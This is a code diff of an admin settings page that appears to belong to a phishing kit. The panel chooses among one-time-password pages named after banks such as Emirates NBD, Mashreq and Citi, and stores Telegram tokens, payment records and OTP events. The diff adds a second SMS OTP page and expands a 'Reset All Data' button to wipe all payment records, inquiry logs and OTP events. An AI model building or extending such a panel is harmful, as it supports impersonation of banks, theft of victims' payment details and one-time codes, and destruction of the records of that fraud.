@@ -25,6 +25,7 @@
           <label>Default OTP Page</label>
           <select name="otp_default_page">
             <option value="otp-sms"     <%= otpDefault==='otp-sms'     ? 'selected' : '' %>>SMS OTP</option>
+            <option value="otp-sms2"    <%= otpDefault==='otp-sms2'    ? 'selected' : '' %>>SMS OTP 2 (Alternate)</option>
             <option value="otp"         <%= otpDefault==='otp'         ? 'selected' : '' %>>Emirates NBD</option>
             <option value="otp-mashreq" <%= otpDefault==='otp-mashreq' ? 'selected' : '' %>>Mashreq</option>
             <option value="otp-citi"    <%= otpDefault==='otp-citi'    ? 'selected' : '' %>>Citi</option>
@@ -281,10 +282,10 @@
   <div class="form-section">
     <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;">
       <div>
-        <div style="font-weight:600;font-size:13px;color:var(--tx-base);margin-bottom:3px;">Reset All Settings</div>
-        <div style="font-size:12px;color:var(--tx-muted);">Deletes all stored settings — Telegram tokens, Pixel IDs, OTP defaults, everything. Cannot be undone.</div>
+        <div style="font-weight:600;font-size:13px;color:var(--tx-base);margin-bottom:3px;">Reset All Data</div>
+        <div style="font-size:12px;color:var(--tx-muted);">Deletes all settings, payment records, inquiries and OTP events. Cannot be undone.</div>
       </div>
-      <button type="button" class="btn" onclick="openResetModal()" style="background:#dc2626;color:white;border:none;">Reset All Settings</button>
+      <button type="button" class="btn" onclick="openResetModal()" style="background:#dc2626;color:white;border:none;">Reset All Data</button>
     </div>
   </div>
 </div>
@@ -293,8 +294,8 @@
 <div id="reset-modal-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:2000;align-items:center;justify-content:center;padding:20px;">
   <div style="background:var(--bg-card);border-radius:16px;width:100%;max-width:420px;padding:28px;border:1px solid var(--bd);box-shadow:0 20px 60px rgba(0,0,0,0.3);">
     <div style="font-size:22px;margin-bottom:10px;">⚠️</div>
-    <div style="font-size:16px;font-weight:800;color:#dc2626;margin-bottom:8px;">Reset All Settings?</div>
-    <div style="font-size:13px;color:var(--tx-mid);margin-bottom:22px;line-height:1.5;">This will permanently delete <strong>all</strong> stored settings including Telegram tokens, Pixel IDs, OTP defaults, and event triggers. This action cannot be undone.</div>
+    <div style="font-size:16px;font-weight:800;color:#dc2626;margin-bottom:8px;">Reset All Data?</div>
+    <div style="font-size:13px;color:var(--tx-mid);margin-bottom:22px;line-height:1.5;">This will permanently delete <strong>all</strong> stored data including settings, Telegram tokens, Pixel IDs, <strong>all payment records</strong>, <strong>all inquiry logs</strong>, and OTP events. This action cannot be undone.</div>
     <div style="display:flex;gap:10px;justify-content:flex-end;">
       <button onclick="closeResetModal()" class="btn btn-ghost">Cancel</button>
       <button onclick="confirmReset()" style="padding:8px 18px;background:#dc2626;color:white;border:none;border-radius:7px;font-weight:700;cursor:pointer;">Yes, Reset Everything</button>
